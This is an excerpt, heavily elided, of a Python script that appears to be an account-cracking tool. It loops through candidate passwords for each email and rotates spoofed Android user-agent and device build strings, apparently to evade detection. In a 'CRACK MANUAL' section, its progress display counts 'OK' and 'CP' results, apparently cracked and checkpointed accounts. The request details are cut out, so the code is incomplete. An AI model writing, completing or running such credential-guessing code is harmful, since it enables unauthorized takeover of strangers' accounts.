...
for z in range(200):
	...
	device = random.choice(["M2006C3LG Build/NHG47L","M2006C3LG Build/LMY47V","M2006C3LG Build/N4F26T","M2006C3LG Build/OPM5.171019.014","M2006C3LG Build/OPR6.170623.023","M2006C3LGBuild/OPM5.171019.015","M2006C3LG Build/MMB29K","M2006C3LG Build/OPM6.171019.030.H1"])
	...
	ua = f"Mozilla/5.0 (Linux; U; Android 10; en-US; Redmi 8A Dual Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.1.8.1295 Mobile Safari/537.36"
...
###----------[ CRACK MANUAL ]---------- ###
	...
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}•{P2} crack {H2}RIZKI378{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				ua = random.choice(["Mozilla/5.0 (Linux; U; Android 10; en-US; Redmi 8A Dual Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.1.8.1295 Mobile Safari/537.36"])
				params = {
...
class Session:
	...
	def generate_ugent(self):
		...
		ugent = f"Mozilla/5.0 (Linux; Android 10; Redmi 8A Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile Safari/537.36"
		return ugent		
